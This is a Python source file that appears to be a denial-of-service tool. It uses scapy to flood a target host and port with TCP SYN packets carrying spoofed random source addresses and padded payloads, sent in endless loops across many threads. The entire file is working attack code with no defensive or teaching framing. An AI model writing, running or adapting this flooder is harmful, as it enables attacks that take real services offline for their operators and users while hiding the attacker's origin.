import threading
from handler import args_handler
from ipgen import fake_ip_gen
from scapy.all import *


        
def attack(target, dest_port, source_port=7000):
    try:
        while True:
            s_addr = fake_ip_gen()   
            ip = IP(src= s_addr, dst= target)
            tcp = TCP(sport =source_port, dport=dest_port, flags="S")
            flood_data = Raw(b"A"*1024)
            pkt =ip / tcp / flood_data
            send(pkt)
            
    except Exception as e:
        print(f"An error occurred: {str(e)}")


 
def main():
    target_ip, dest_port, source_port, num_threads = args_handler() 
    
    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(target_ip, dest_port, source_port))
        thread.start()

  
if __name__ == '__main__':
    main()
 